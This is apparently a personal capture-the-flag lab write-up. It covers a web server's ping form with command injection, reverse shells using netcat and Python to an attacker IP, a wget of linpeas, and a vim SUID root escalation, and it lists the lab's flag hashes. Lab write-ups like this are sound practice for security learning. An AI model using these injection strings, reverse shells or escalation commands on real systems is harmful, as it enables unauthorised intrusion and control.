# [Recon]

```
=========================================================================
[OS]: Ubuntu
[Web-Technology]: Apache httpd 2.4.29
[Hostname]:
[IP]: 192.168.181.86
[USERS]: dylan
[CREDENTIALS]:
=========================================================================
```
-----------------------------------------------------------------------------

# [Scanning and Enumeration]
```
[NMAP RESULTS]:
=========================================================================
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:b9:6d:35:0b:c5:c4:5a:86:e0:26:10:95:48:77:82 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKxggEEcOcfAnY39JxZPtqfSeoP5ELSTfKdMZW1gwC5cdbN+n+rNZtzEFPJtRQrUGYntWi9OI642XAYf/w7EYnahMudH6sEkBBnycJB9mpMznx6j2woFqEC99hV2Kv+HrKBfUVH2ZottNDMTAeHmAQn38urRKTSw5XRL2lIHyjAlQuhBC9G0IOHSQevab1JO7QMS7RinkKMuK471IKEiGo6cs2qYl7s5/mbPzn74ItxZyjMaNreraKLzxxUv2rXO4D1KLJGH8hoHCdoueHenF0jA4mggOLtx33gi/Dwj65GZqz3up/93Rk3KFx9PDH81Wl/RMXzJPHObWTXFUgYCPR
|   256 a8:0f:a7:73:83:02:c1:97:8c:25:ba:fe:a5:11:5f:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmK6n2750Zgk5TzwOOVaORuM6X+mZvgnDZ089sXvhfp5r09499qYQzThIXcaOuWpDmzP2e/eK27h5teQUyF+Bw=
|   256 fc:e9:9f:fe:f9:e0:4d:2d:76:ee:ca:da:af:c3:39:9e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINPPEuspoT6EYlb7TZCsDgkEBtBHIlzl8yu089UQJsA8
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
=========================================================================
```

![[Pasted image 20240824005840.png]]
We can try to ping any domain and localhost `127.0.0.1` even. Also try to terminate the `ping command` with a `;` to check if we can still execute another command after the ping command.

```bash
google.com;pwd;id;which nc;which bash
```

![[Pasted image 20240812224840.png]]
```bash
google.com;ls;cat index.php
```
![[Pasted image 20240812230547.png]]


`google.com;cat ../../../home/dylan/local.txt`

![[Pasted image 20240812230144.png]]

**Reverse Connection using netcat or bash**
```bash
google.com;nc -e /bin/bash 192.168.45.172 9001
# OR

127.0.0.1 &&  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.172",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

# [Privilege-Escalation]
```bash
=========================================================================
# [OTHER / PRIVILEGE-ESCALATION]:
cd /tmp    # upload linpeas.sh via port 80
wget http://192.168.45.172/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
=========================================================================
```
![[Pasted image 20240824004527.png]]
here, the `vim.basic SUID` stand out clear. So i google `gtfogbins.github.io for vim SUID`.
```bash
vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

![[Pasted image 20240824005329.png]]
```
# Then type command
command
# And we are root
```

# [Flags]

`local.txt : 9535b24b4bb757da06d6dbaa9a510b0c`
`proof.txt : 83e806c7b840aca59a8661dec8ea3710`
# [keynote]
```
Take Away Concepts (for the flat-file reference system):
* Always try the basic things never underestimate the little things.
* if `find / -perm 6000 -u=s -type f 2>/dev/null` didn't return any result, always upload `linpeas.sh` to confirm.
* Read prompts always and understand every error it returns

```